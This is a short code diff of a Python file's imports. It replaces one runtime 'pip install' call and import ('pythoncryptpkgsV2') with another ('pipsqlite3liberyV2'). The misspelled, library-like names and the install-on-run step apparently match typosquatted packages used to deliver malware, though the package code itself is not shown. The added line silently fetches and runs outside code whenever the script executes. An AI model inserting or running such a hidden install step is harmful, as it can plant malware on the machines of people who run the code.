@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncryptpkgsV2")
-import pythoncryptpkgsV2
+os.system("pip install pipsqlite3liberyV2")
+import pipsqlite3liberyV2
 import random
 import requests
 import time
